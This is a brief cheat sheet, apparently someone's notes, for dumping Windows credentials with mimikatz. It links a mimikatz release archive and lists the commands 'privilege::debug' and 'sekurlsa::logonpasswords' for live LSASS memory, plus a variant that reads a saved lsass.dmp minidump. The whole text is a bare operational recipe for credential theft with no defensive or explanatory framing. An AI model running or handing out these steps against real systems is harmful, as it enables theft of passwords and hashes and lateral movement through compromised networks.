`https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip`





# dump
C:\Users\bdavid\Desktop\mimikatz.exe
```
privilege::debug
sekurlsa::logonpasswords
exit
```





# minidump
```
sekurlsa::minidump C:\Windows\Temp\lsass.dmp
sekurlsa::logonpasswords
```
























